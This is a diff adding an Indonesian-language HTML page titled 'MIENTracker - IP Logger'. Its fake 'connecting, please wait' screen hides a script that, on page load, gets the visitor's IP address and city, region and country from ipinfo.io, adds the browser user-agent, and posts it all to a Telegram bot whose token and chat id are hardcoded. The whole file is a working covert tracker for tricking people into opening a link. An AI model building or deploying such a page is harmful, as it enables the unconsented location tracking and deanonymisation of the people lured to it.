@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>MIENTracker - IP Logger</title>
+  <style>
+    body { background-color: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+  </style>
+</head>
+<body>
+  <h1>🕵️‍♂️ Menghubungkan...</h1>
+  <p>Harap tunggu...</p>
+
+<script>
+fetch("https://ipinfo.io/json?token=demo")
+  .then(res => res.json())
+  .then(data => {
+    const ip = data.ip;
+    const city = data.city;
+    const region = data.region;
+    const country = data.country;
+    const ua = navigator.userAgent;
+
+    const pesan = "🌐 IP: " + ip + "\n📍 Lokasi: " + city + ", " + region + ", " + country + "\n🧠 User-Agent: " + ua;
+
+    fetch("https://api.telegram.org/bot8113101605:AAELCPTCdr4cEBe6opWXY7Rg5UEM969iPUM/sendMessage", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: "7932600874",
+        text: pesan
+      })
+    });
+  })
+  .catch(() => console.log("Gagal ambil IP"));
+</script>
+</body>
+</html>
